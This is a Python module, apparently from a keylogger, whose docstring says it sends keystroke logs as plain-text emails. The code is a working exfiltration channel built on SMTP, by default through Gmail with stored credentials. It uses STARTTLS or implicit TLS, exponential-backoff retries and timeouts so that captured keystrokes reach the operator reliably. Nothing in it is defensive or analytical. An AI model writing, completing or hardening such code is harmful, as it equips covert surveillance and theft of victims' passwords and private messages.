"""Email log delivery via SMTP.

Sends keystroke logs as plain-text emails with:

* STARTTLS (default) or implicit TLS via ``SMTP_SSL``,
* retries with exponential backoff for transient SMTP/network errors,
* fail-fast on authentication errors (bad credentials never retried),
* timeouts on every socket operation so a dead server cannot hang the
  reporter thread forever.
"""

from __future__ import annotations

import logging
import smtplib
import ssl
import time
from email.message import EmailMessage
from typing import Optional

logger = logging.getLogger(__name__)

#: Fail fast on these: retrying will never succeed.
_AUTH_ERRORS = (smtplib.SMTPAuthenticationError,)

#: Transient conditions worth retrying.
_RETRYABLE_ERRORS = (
    smtplib.SMTPServerDisconnected,
    smtplib.SMTPSenderRefused,
    smtplib.SMTPRecipientsRefused,
    smtplib.SMTPDataError,
    smtplib.SMTPConnectError,
    smtplib.SMTPHeloError,
    smtplib.SMTPNotSupportedError,
    OSError,
    ssl.SSLError,
)


class EmailReporter:
    """Delivers log messages by email through an SMTP server."""

    def __init__(
        self,
        sender: str,
        password: str,
        *,
        receiver: Optional[str] = None,
        smtp_host: str = "smtp.gmail.com",
        smtp_port: int = 587,
        use_starttls: bool = True,
        timeout: float = 15.0,
        max_retries: int = 3,
        base_backoff: float = 2.0,
    ) -> None:
        self._sender = sender
        self._receiver = receiver or sender
        self._user = sender
        self._password = password
        self._host = smtp_host
        self._port = smtp_port
        self._use_starttls = use_starttls
        self._timeout = timeout
        self._max_retries = max_retries
        self._base_backoff = base_backoff

    def send(self, subject: str, body: str) -> bool:
        """Send *body* as an email with the given *subject*. Returns success."""
        if not body:
            return True

        message = EmailMessage()
        message["Subject"] = subject
        message["From"] = self._sender
        message["To"] = self._receiver
        message.set_content(body)

        for attempt in range(self._max_retries):
            try:
                self._deliver(message)
                return True
            except _AUTH_ERRORS as exc:
                logger.error(
                    "SMTP authentication failed for %s: %s. "
                    "Check the password (Gmail requires an app password).",
                    self._user,
                    exc,
                )
                return False
            except _RETRYABLE_ERRORS as exc:
                logger.warning(
                    "Email delivery failed (attempt %d/%d): %s",
                    attempt + 1,
                    self._max_retries,
                    exc,
                )
                if attempt < self._max_retries - 1:
                    time.sleep(self._base_backoff * (2**attempt))
            except Exception as exc:  # pragma: no cover - defensive
                logger.exception("Unexpected email delivery error: %s", exc)
                return False

        logger.error("Failed to deliver email after %d attempts", self._max_retries)
        return False

    # -- internals ----------------------------------------------------------

    def _deliver(self, message: EmailMessage) -> None:
        """Open a connection and send the message (one attempt)."""
        server: Optional[smtplib.SMTP] = None
        try:
            if self._use_starttls:
                server = smtplib.SMTP(self._host, self._port, timeout=self._timeout)
                server.ehlo()
                server.starttls(context=ssl.create_default_context())
                server.ehlo()
            else:
                server = smtplib.SMTP_SSL(
                    self._host,
                    self._port,
                    timeout=self._timeout,
                    context=ssl.create_default_context(),
                )
            server.login(self._user, self._password)
            server.send_message(message)
        finally:
            if server is not None:
                try:
                    server.quit()
                except Exception:  # pragma: no cover - defensive
                    server.close()
